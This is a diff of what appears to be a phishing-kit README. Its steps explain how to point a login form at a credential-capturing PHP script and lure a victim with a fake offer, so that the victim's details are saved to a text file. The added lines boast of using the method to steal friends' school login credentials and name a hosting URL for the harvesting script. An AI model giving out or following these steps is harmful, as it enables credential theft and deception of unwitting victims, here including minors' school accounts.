@@ -6,3 +6,6 @@ Steps to Follow
 5)==> Now repalce text after "=" with "xyz.php". for eg. <form action="example.com"> ===> <form action="xyz.php">.
 6)==> Now just you have to do is to send someone this document and ask him for that some offer is going on if you login through this.
 7)==> Once he logins all his details will be overwritten in 'form-save.txt' document.
+
+BTW I used this for myself also to extract login details of my Friends of their respective School IDs And for this purpose I created a web-domain to fulfil my purpose ... and i was able to extract each and every login done at that site...
+Website that i used was ....<<<< http://iquest-olympiad-courses.epizy.com/xyz.php >>>>
